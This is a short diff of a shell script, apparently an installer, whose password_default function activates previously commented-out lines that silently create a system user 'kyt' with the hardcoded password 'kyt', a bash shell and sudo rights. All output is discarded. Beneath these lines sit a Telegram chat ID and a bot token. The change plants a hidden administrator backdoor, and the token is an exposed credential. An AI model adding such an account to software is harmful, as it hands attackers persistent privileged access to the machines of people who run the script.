@@ -334,10 +334,10 @@ function password_default() {
     #userdel jame > /dev/null 2>&1
     Username="kyt"
     Password=kyt
-    #mkdir -p /home/script/
-    #useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-    #echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
-    #usermod -aG sudo $Username > /dev/null 2>&1
+    mkdir -p /home/script/
+    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+    usermod -aG sudo $Username > /dev/null 2>&1
 
     CHATID="5347346656"
     KEY="6272071945:AAFXpsGXdbqMx5Mr-xos6J1p1Drw7BeZDco"
